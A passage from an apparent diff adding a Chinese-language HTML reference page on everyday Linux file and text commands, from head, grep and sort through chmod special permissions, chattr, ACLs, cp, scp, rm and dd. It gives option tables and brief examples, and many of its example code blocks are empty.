+<td style="text-align:left">从顶部清屏，然后显示</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>-d</code></td>
+<td style="text-align:left">提示 “Press space to continue，’q’ to quit（按空格键继续，按 q 键退出）”，禁用响铃功能</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>-l</code></td>
+<td style="text-align:left">忽略 Ctrl+l（换页）字符</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>-p</code></td>
+<td style="text-align:left">通过清除窗口而不是滚屏来对文件进行换页，与 -c 选项相似</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>-s</code></td>
+<td style="text-align:left">把连续的多个空行显示为一行</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>-u</code></td>
+<td style="text-align:left">把文件内容中的下画线去掉</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<p><code>more anaconda-ks.cfg</code></p>
+<h3> head</h3>
+<p>head 用于查看纯文本文件的前 N 行，语法格式：<code>head [选项] 文件名称</code></p>
+<blockquote>
+<p>默认查看文本文件的前 10 行</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-n</td>
+<td style="text-align:left">指定前 N 行</td>
+</tr>
+<tr>
+<td style="text-align:center">-c</td>
+<td style="text-align:left">输出文件前面的 K 个字节</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<p><code>head -n 5 anaconda-ks.cfg</code></p>
+<h3> tail</h3>
+<p>tail 用于查看纯文本文件的后 N 行或持续刷新文件的最新内容，语法格式：<code>tail [选项] 文件名称</code></p>
+<blockquote>
+<p>默认查看文本文件的后 10 行</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-n</td>
+<td style="text-align:left">指定后 N 行</td>
+</tr>
+<tr>
+<td style="text-align:center">-c</td>
+<td style="text-align:left">输出文件最后的 K 个字节</td>
+</tr>
+<tr>
+<td style="text-align:center">-f</td>
+<td style="text-align:left">持续刷新文件内容</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<p><code>tail -n 5 anaconda-ks.cfg</code></p>
+<h3> tr</h3>
+<p>tr 用于替换文本内容中的字符，语法格式：<code>tr [原始字符] [目标字符]</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-d</td>
+<td style="text-align:left">删除指定字符串</td>
+</tr>
+<tr>
+<td style="text-align:center">-s</td>
+<td style="text-align:left">删除所有重复出现字符序列，只保留一个；即将重复出现字符串压缩为一个字符串</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> wc</h3>
+<p>wc 用于统计指定文本文件的行数、字数或字节数，语法格式：<code>wc [选项] 文件名称</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-l</td>
+<td style="text-align:left">只显示行数</td>
+</tr>
+<tr>
+<td style="text-align:center">-w</td>
+<td style="text-align:left">只显示单词数</td>
+</tr>
+<tr>
+<td style="text-align:center">-c</td>
+<td style="text-align:left">只显示字节数</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> stat</h3>
+<p>stat 用于查看文件的具体存储细节和时间等信息，语法格式：<code>stat 文件名称</code></p>
+<p>example：</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> grep</h3>
+<p>grep 用于按行提取文本内容，语法格式：<code>grep [选项] 文件名称</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-b</td>
+<td style="text-align:left">将可执行文件（binary）当作文本文件（text）来搜索</td>
+</tr>
+<tr>
+<td style="text-align:center">-c</td>
+<td style="text-align:left">仅显示找到的行数</td>
+</tr>
+<tr>
+<td style="text-align:center">-i</td>
+<td style="text-align:left">忽略大小写</td>
+</tr>
+<tr>
+<td style="text-align:center">-n</td>
+<td style="text-align:left">显示行号</td>
+</tr>
+<tr>
+<td style="text-align:center">-v</td>
+<td style="text-align:left">取反</td>
+</tr>
+<tr>
+<td style="text-align:center">-E</td>
+<td style="text-align:left">扩展 grep</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> cut</h3>
+<p>cut 用于案列提取文本内容，语法格式：<code>cut [选项] 文件名称</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-b</td>
+<td style="text-align:left">以字节为单位进行分割</td>
+</tr>
+<tr>
+<td style="text-align:center">-c</td>
+<td style="text-align:left">以字符为单位进行分割</td>
+</tr>
+<tr>
+<td style="text-align:center">-d</td>
+<td style="text-align:left">自定义分隔符，默认为制表符</td>
+</tr>
+<tr>
+<td style="text-align:center">-f</td>
+<td style="text-align:left">设置需要查看的列数</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> diff</h3>
+<p>diff 用于比较多个文件之间内容的差异，语法格式：<code>diff [选项] 文件名称A 文件名称B</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-a</td>
+<td style="text-align:left">diff 只会逐行比较文本文件</td>
+</tr>
+<tr>
+<td style="text-align:center">-b</td>
+<td style="text-align:left">不检查空格字符的不同</td>
+</tr>
+<tr>
+<td style="text-align:center">-c</td>
+<td style="text-align:left">描述文件内容具体的不同</td>
+</tr>
+<tr>
+<td style="text-align:center">-H</td>
+<td style="text-align:left">比较大文件时，可加快速度</td>
+</tr>
+</tbody>
+</table>
+<p>diff 命令的显示结果有以下两种方式：</p>
+<ul>
+<li><code>&lt;</code>：表示第一个文件中的数据行。</li>
+<li><code>&gt;</code>：表示第二个文件中的数据行。</li>
+</ul>
+<p>example：</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> uniq</h3>
+<p>uniq 用于去除文本中连续重复的行，语法格式：<code>uniq [选项] 文件名称</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-c, --count</td>
+<td style="text-align:left">打印每行出现的次数</td>
+</tr>
+<tr>
+<td style="text-align:center">-d, --repeated</td>
+<td style="text-align:left">只打印重复出现的行</td>
+</tr>
+<tr>
+<td style="text-align:center">-D</td>
+<td style="text-align:left">打印所有重复行</td>
+</tr>
+<tr>
+<td style="text-align:center">--all-repeated[=METHOD]</td>
+<td style="text-align:left">类似 -D，使用空行分隔每个组，METHOD=none,prepend,separate</td>
+</tr>
+<tr>
+<td style="text-align:center">-f, --skip-fields=N</td>
+<td style="text-align:left">不比较前 N 个字段</td>
+</tr>
+<tr>
+<td style="text-align:center">--group[=METHOD]</td>
+<td style="text-align:left">使用空行分隔每个组，METHOD=separate,prepend,append,both</td>
+</tr>
+<tr>
+<td style="text-align:center">-i, --ignore-case</td>
+<td style="text-align:left">忽略大小写</td>
+</tr>
+<tr>
+<td style="text-align:center">-s, --skip-chars=N</td>
+<td style="text-align:left">不比较前 N 个字符</td>
+</tr>
+<tr>
+<td style="text-align:center">-u, --unique</td>
+<td style="text-align:left">只打印出现一次的行</td>
+</tr>
+<tr>
+<td style="text-align:center">-z, --zero-terminated</td>
+<td style="text-align:left">行分隔符是 NUL 而不是换行符</td>
+</tr>
+<tr>
+<td style="text-align:center">-w, --check-chars=N</td>
+<td style="text-align:left">比较不多于 N 个字符</td>
+</tr>
+<tr>
+<td style="text-align:center">--help</td>
+<td style="text-align:left">帮助文档</td>
+</tr>
+<tr>
+<td style="text-align:center">--version</td>
+<td style="text-align:left">版本信息</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> sort</h3>
+<p>sort 用于对文本内容进行排序，默认为正序排序，语法格式：<code>sort [选项] 文件名称</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-f</td>
+<td style="text-align:left">忽略大小写</td>
+</tr>
+<tr>
+<td style="text-align:center">-b</td>
+<td style="text-align:left">忽略缩进与空格</td>
+</tr>
+<tr>
+<td style="text-align:center">-n</td>
+<td style="text-align:left">以数值型排序</td>
+</tr>
+<tr>
+<td style="text-align:center">-r</td>
+<td style="text-align:left">反向排序</td>
+</tr>
+<tr>
+<td style="text-align:center">-u</td>
+<td style="text-align:left">去除重复行</td>
+</tr>
+<tr>
+<td style="text-align:center">-t</td>
+<td style="text-align:left">指定间隔符</td>
+</tr>
+<tr>
+<td style="text-align:center">-k</td>
+<td style="text-align:left">设置字段范围</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> split</h3>
+<p>split 用于将一个文件分割成数个，语法格式：<code>split [选项] 文件名</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-a</td>
+<td style="text-align:left">生成长度为 N 的后缀（默认值为 2）</td>
+</tr>
+<tr>
+<td style="text-align:center">--additional-suffix=SUFFIX</td>
+<td style="text-align:left">将附加后缀添加到分割后的文件名</td>
+</tr>
+<tr>
+<td style="text-align:center">-b</td>
+<td style="text-align:left">为每个输出文件输入 SIZE 字节</td>
+</tr>
+<tr>
+<td style="text-align:center">-C</td>
+<td style="text-align:left">每个输出文件最多放置行的大小字节</td>
+</tr>
+<tr>
+<td style="text-align:center">-d</td>
+<td style="text-align:left">使用从 0 开始的数字后缀，而不是字母后缀</td>
+</tr>
+<tr>
+<td style="text-align:center">--numeric-suffixes[=FROM]</td>
+<td style="text-align:left">与 -d 相同，但允许设置起始值</td>
+</tr>
+<tr>
+<td style="text-align:center">-x</td>
+<td style="text-align:left">使用从 0 开始的十六进制后缀，而不是字母后缀</td>
+</tr>
+<tr>
+<td style="text-align:center">--hex-suffixes[=FROM]</td>
+<td style="text-align:left">与 -x 相同，但允许设置起始值</td>
+</tr>
+<tr>
+<td style="text-align:center">-e</td>
+<td style="text-align:left">不会生成带有 “-n” 的空输出文件</td>
+</tr>
+<tr>
+<td style="text-align:center">--filter=COMMAND</td>
+<td style="text-align:left">写入 shel 命令；文件名为 $file</td>
+</tr>
+<tr>
+<td style="text-align:center">-l</td>
+<td style="text-align:left">指定分割每个文件的长度（默认为 1000 行）</td>
+</tr>
+<tr>
+<td style="text-align:center">-n</td>
+<td style="text-align:left">指定分割多少个文件</td>
+</tr>
+<tr>
+<td style="text-align:center">-u</td>
+<td style="text-align:left">使用 “-n r/…” 立即将输入复制到输出</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> touch</h3>
+<p>touch 用于创建空白文件或设置文件的时间，语法格式：<code>touch [选项] 文件名称</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-a</td>
+<td style="text-align:left">仅修改 “读取时间”（atime）</td>
+</tr>
+<tr>
+<td style="text-align:center">-m</td>
+<td style="text-align:left">仅修改 “修改时间”（mtime）</td>
+</tr>
+<tr>
+<td style="text-align:center">-d</td>
+<td style="text-align:left">同时修改 atime 和 mtime</td>
+</tr>
+<tr>
+<td style="text-align:center">-c</td>
+<td style="text-align:left">仅修改文件的时间，若该文件不存在则不建立新文件</td>
+</tr>
+<tr>
+<td style="text-align:center">-t</td>
+<td style="text-align:left">后面可以接想要修改的时间而不用目前时间，格式为[YYMMDDhhmm]</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<p><code>touch -d "2022-05-06" 15:21 anaconda-ks.cfg</code></p>
+<h3> mkdir</h3>
+<p>mkdir 用于创建目录，语法格式：<code>mkdir [选项] 目录名称</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-p</td>
+<td style="text-align:left">递归创建目录</td>
+</tr>
+<tr>
+<td style="text-align:center">-m</td>
+<td style="text-align:left">在创建目录的同时设定权限</td>
+</tr>
+<tr>
+<td style="text-align:center">-v</td>
+<td style="text-align:left">显示创建目录的过程信息</td>
+</tr>
+<tr>
+<td style="text-align:center">-Z</td>
+<td style="text-align:left">将每个创建的目录的 SELinux 安全环境设置为 CTX</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<p><code>mkdir aaa</code></p>
+<h3> chmod</h3>
+<p>chmod 用于修改文件属主、属组和其它用户访问权限，语法格式：<code>chmod [选项] 文件名</code></p>
+<blockquote>
+<p>读、写、执行的权限可以分别用：<code>4、2、1</code> 数字表示<br>
+属主、属组、其它用户可以分别用：<code>u、g、o</code> 表示<br>
+字母 <code>a</code> 包括属主、属组、其它用户</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-c</td>
+<td style="text-align:left">若该文件权限确实已经更改，才显示其更改动作</td>
+</tr>
+<tr>
+<td style="text-align:center">-f</td>
+<td style="text-align:left">若该文件权限无法被更改也不要显示错误信息</td>
+</tr>
+<tr>
+<td style="text-align:center">-v</td>
+<td style="text-align:left">显示权限变更的详细信息</td>
+</tr>
+<tr>
+<td style="text-align:center">-R</td>
+<td style="text-align:left">递归更改文件和目录</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<p><code>drwxr-xr-x. 110 root root 8192 Oct 10 14:50 etc</code></p>
+<ul>
+<li><code>d</code>：这个 “<code>d</code>” 表示这是一个目录文件（“<code>-</code>” 表示普通文件；“<code>l</code>” 表示链接文件；“<code>p</code>” 表示管道文件；“<code>b</code>” 表示块设备文件；“<code>c</code>” 表示字符设备文件）</li>
+<li><code>rwx</code>：第一个 “<code>rwx</code>” 表示属主具有读、写、执行的权限</li>
+<li><code>r-x</code>：第二个 “<code>r-x</code>” 表示属组具有读、执行的权限（读、写、执行，没有哪一个权限，就用 “<code>-</code>” 代替）</li>
+<li><code>r-x</code>：第三个 “<code>r-x</code>” 表示其它用户具有读、执行的权限</li>
+<li><code>.</code>：最后的 “<code>.</code>” 表示 SELinux 安全机制打开</li>
+</ul>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><blockquote>
+<p>以上几种修改权限方式都可以</p>
+</blockquote>
+<h4> 特殊权限</h4>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">u+s</td>
+<td style="text-align:left">设置 SUID 权限</td>
+</tr>
+<tr>
+<td style="text-align:center">u-s</td>
+<td style="text-align:left">取消 SUID 权限</td>
+</tr>
+<tr>
+<td style="text-align:center">g+s</td>
+<td style="text-align:left">设置 SGID 权限</td>
+</tr>
+<tr>
+<td style="text-align:center">g-s</td>
+<td style="text-align:left">取消 SGID 权限</td>
+</tr>
+<tr>
+<td style="text-align:center">o+t</td>
+<td style="text-align:left">设置 SBIT 权限</td>
+</tr>
+<tr>
+<td style="text-align:center">o-t</td>
+<td style="text-align:left">取消 SBIT 权限</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>SUID：可以让执行者临时拥有文件属主的权限，如果原有文件有 <code>x</code> 执行权，赋予特殊权限后为 <code>rws</code>，如果原有文件没有 <code>x</code> 执行权，赋予特殊权限后为 <code>rwS</code>（例如：-<code>rws</code>r-xr-x.）
+<ul>
+<li>执行者可以临时获得文件属主的身份，进行操作</li>
+</ul>
+</li>
+<li>SGID：可以让执行者临时拥有文件属组的权限，如果原有文件有 <code>x</code> 执行权，赋予特殊权限后为 <code>rws</code>，如果原有文件没有 <code>x</code> 执行权，赋予特殊权限后为 <code>rwS</code>（例如：-rwx<code>r-s</code>r-x.）
+<ul>
+<li>对普通文件设置时，让执行者临时拥有文件属组的权限；而对目录进行设置时，让目录内新创建的文件属组自动继承该目录原有的属组</li>
+</ul>
+</li>
+<li>SBIT：可以确保用户只能删除自己的文件，不能删除其它用户的文件，如果原有文件有 <code>x</code> 执行权，赋予特殊权限后为 <code>rwt</code>，如果原有文件没有 <code>x</code> 执行权，赋予特殊权限后为 <code>rwT</code>（例如：-rwxr-x<code>r-t</code>.）
+<ul>
+<li>当某个目录设置了 SBIT 权限后，该目录中的文件就只能被其属主用户删除，其它用户没有删除权限</li>
+</ul>
+</li>
+<li>X：特殊执行权限，只有当文件为目录文件，或者其他类型的用户有可执行权限时，才将文件权限设置可执行</li>
+</ul>
+<p>example：</p>
+<p><code>chmod u+s aaa.txt</code></p>
+<h3> chattr</h3>
+<p>chattr 用于设置文件的隐藏权限，语法格式：<code>chattr [选项] 文件名</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">i</td>
+<td style="text-align:left">无法对文件进行修改，若对目录设置该选项，则仅能修改其中的子文件内容而不能新建或删除文件</td>
+</tr>
+<tr>
+<td style="text-align:center">a</td>
+<td style="text-align:left">仅允许补充（追加）内容，无法覆盖/删除内容（Append Only）</td>
+</tr>
+<tr>
+<td style="text-align:center">S</td>
+<td style="text-align:left">文件内容在变更后立即同步到硬盘（sync）</td>
+</tr>
+<tr>
+<td style="text-align:center">s</td>
+<td style="text-align:left">彻底从硬盘中删除，不可恢复（用 0 填充原文件所在硬盘区域）</td>
+</tr>
+<tr>
+<td style="text-align:center">A</td>
+<td style="text-align:left">不再修改这个文件或目录的最后访问时间（atime）</td>
+</tr>
+<tr>
+<td style="text-align:center">b</td>
+<td style="text-align:left">不再修改文件或目录的存取时间</td>
+</tr>
+<tr>
+<td style="text-align:center">D</td>
+<td style="text-align:left">检查压缩文件中的错误</td>
+</tr>
+<tr>
+<td style="text-align:center">d</td>
+<td style="text-align:left">使用 dump 命令备份时忽略本文件/目录</td>
+</tr>
+<tr>
+<td style="text-align:center">c</td>
+<td style="text-align:left">默认将文件或目录进行压缩</td>
+</tr>
+<tr>
+<td style="text-align:center">U</td>
+<td style="text-align:left">当删除该文件后依然保留其在硬盘中的数据，方便日后恢复</td>
+</tr>
+<tr>
+<td style="text-align:center">t</td>
+<td style="text-align:left">让文件系统支持尾部合并（tail-merging）</td>
+</tr>
+<tr>
+<td style="text-align:center">x</td>
+<td style="text-align:left">可以直接访问压缩文件中的内容</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<p><code>chattr +i aaa.txt</code></p>
+<h3> lsattr</h3>
+<p>lsattr 用于查看文件的隐藏权限，语法格式：<code>lsattr [选项] 文件名</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-R</td>
+<td style="text-align:left">递归列出目录及其内容的属性</td>
+</tr>
+<tr>
+<td style="text-align:center">-V</td>
+<td style="text-align:left">显示程序版本</td>
+</tr>
+<tr>
+<td style="text-align:center">-a</td>
+<td style="text-align:left">列出目录中的所有文件，包括以 “.” 开头的文件</td>
+</tr>
+<tr>
+<td style="text-align:center">-d</td>
+<td style="text-align:left">列出目录，而不是列出其内容</td>
+</tr>
+<tr>
+<td style="text-align:center">-l</td>
+<td style="text-align:left">使用长名称而不是单字符缩写打印选项</td>
+</tr>
+<tr>
+<td style="text-align:center">-p</td>
+<td style="text-align:left">列出文件的项目编号</td>
+</tr>
+<tr>
+<td style="text-align:center">-v</td>
+<td style="text-align:left">列出文件的版本/生成编号</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<p><code>lsattr aaa.txt</code></p>
+<h3> setfacl</h3>
+<p>setfacl 用于管理文件的 ACL 权限规则，语法格式：<code>setfacl [选项] 文件名</code></p>
+<blockquote>
+<p>查看文件是否设置 ACL 权限，可以通过 <code>ls</code> 命令查看文件最后的 “<code>.</code>”，如果变成 “<code>+</code>” 号，则这个文件已经设置了 ACL 权限</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-m</td>
+<td style="text-align:left">修改权限</td>
+</tr>
+<tr>
+<td style="text-align:center">-M</td>
+<td style="text-align:left">从文件中读取权限</td>
+</tr>
+<tr>
+<td style="text-align:center">-x</td>
+<td style="text-align:left">删除某个权限</td>
+</tr>
+<tr>
+<td style="text-align:center">-b</td>
+<td style="text-align:left">删除全部权限</td>
+</tr>
+<tr>
+<td style="text-align:center">-R</td>
+<td style="text-align:left">递归子目录</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h3> getfacl</h3>
+<p>getfacl 用于查看文件的 ACL 权限规则，语法格式：<code>getfacl [选项] 文件名</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-a</td>
+<td style="text-align:left">仅显示文件访问控制列表</td>
+</tr>
+<tr>
+<td style="text-align:center">-d</td>
+<td style="text-align:left">仅显示默认访问控制列表</td>
+</tr>
+<tr>
+<td style="text-align:center">-c</td>
+<td style="text-align:left">不显示注释标题</td>
+</tr>
+<tr>
+<td style="text-align:center">-e</td>
+<td style="text-align:left">打印所有有效权限</td>
+</tr>
+<tr>
+<td style="text-align:center">-E</td>
+<td style="text-align:left">打印无有效权限</td>
+</tr>
+<tr>
+<td style="text-align:center">-s</td>
+<td style="text-align:left">只包含基本项的跳过文件</td>
+</tr>
+<tr>
+<td style="text-align:center">-R</td>
+<td style="text-align:left">递归到子目录中</td>
+</tr>
+<tr>
+<td style="text-align:center">-L</td>
+<td style="text-align:left">逻辑行走，遵循符号链接</td>
+</tr>
+<tr>
+<td style="text-align:center">-P</td>
+<td style="text-align:left">物理行走，不遵循符号链接</td>
+</tr>
+<tr>
+<td style="text-align:center">-t</td>
+<td style="text-align:left">使用表格输出格式</td>
+</tr>
+<tr>
+<td style="text-align:center">-n</td>
+<td style="text-align:left">打印数字用户/组标识符</td>
+</tr>
+<tr>
+<td style="text-align:center">-p</td>
+<td style="text-align:left">不去除路径名中的前导 “/”</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h3> cp</h3>
+<p>cp 用于本地复制文件或目录，语法格式：<code>cp [选项] 源文件 目标文件</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-p</td>
+<td style="text-align:left">保留原始文件的属性</td>
+</tr>
+<tr>
+<td style="text-align:center">-d</td>
+<td style="text-align:left">若对象为 “链接文件”，则保留该 “链接文件” 的属性</td>
+</tr>
+<tr>
+<td style="text-align:center">-r</td>
+<td style="text-align:left">递归复制目录</td>
+</tr>
+<tr>
+<td style="text-align:center">-i</td>
+<td style="text-align:left">若目标文件存在，则询问是否覆盖</td>
+</tr>
+<tr>
+<td style="text-align:center">-a</td>
+<td style="text-align:left">向当于 -pdr</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<p><code>cp anaconda-ks.cfg /opt/</code></p>
+<h3> scp</h3>
+<p>scp 用于跨主机传输数据，而且所有的数据都进行加密处理，语法格式：<code>scp [选项] 本地文件 远程账户@远程IP地址:远程目录 | scp [选项] 远程账户@远程IP地址:远程目录 本地文件</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-v</td>
+<td style="text-align:left">显示详细的连接进度</td>
+</tr>
+<tr>
+<td style="text-align:center">-P</td>
+<td style="text-align:left">指定远程主机的 sshd 端口号</td>
+</tr>
+<tr>
+<td style="text-align:center">-r</td>
+<td style="text-align:left">用于传送文件夹</td>
+</tr>
+<tr>
+<td style="text-align:center">-6</td>
+<td style="text-align:left">使用 IPv6 协议</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h3> mv</h3>
+<p>mv 用于移动或重命名文件，语法格式：<code>mv [选项] 源文件 目标文件</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-b</td>
+<td style="text-align:left">当文件存在时，覆盖前，为其创建一个备份</td>
+</tr>
+<tr>
+<td style="text-align:center">-f</td>
+<td style="text-align:left">强制覆盖前不提示</td>
+</tr>
+<tr>
+<td style="text-align:center">-i</td>
+<td style="text-align:left">覆盖前的交互式提示</td>
+</tr>
+<tr>
+<td style="text-align:center">-n</td>
+<td style="text-align:left">无清除不覆盖现有文件</td>
+</tr>
+<tr>
+<td style="text-align:center">-S</td>
+<td style="text-align:left">为备份文件指定后缀，而不使用默认的后缀</td>
+</tr>
+<tr>
+<td style="text-align:center">-u</td>
+<td style="text-align:left">仅当 SOURCE 文件较新时更新移动目标文件</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<p><code>mv anaconda-ks.cfg /opt/</code></p>
+<h3> rm</h3>
+<p>rm 用于删除文件或目录，语法格式：<code>rm [选项] 文件名称</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-f</td>
+<td style="text-align:left">强制执行</td>
+</tr>
+<tr>
+<td style="text-align:center">-i</td>
+<td style="text-align:left">删除前询问</td>
+</tr>
+<tr>
+<td style="text-align:center">-r</td>
+<td style="text-align:left">删除目录</td>
+</tr>
+<tr>
+<td style="text-align:center">-v</td>
+<td style="text-align:left">显示过程</td>
+</tr>
+</tbody>
+</table>
+<p>example：</p>
+<p><code>rm C.txt</code></p>
+<h3> dd</h3>
+<p>dd 用于按照指定大小的数据块个数来复制文件或转换文件，语法格式：<code>dd if=参数值 of=参数值 count=参数值 bs=参数值</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">选项</th>
+<th style="text-align:left">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">if</td>
+<td style="text-align:left">输入的文件名称</td>
+</tr>
+<tr>
+<td style="text-align:center">of</td>
+<td style="text-align:left">输出的文件名称</td>
+</tr>
+<tr>
+<td style="text-align:center">bs</td>
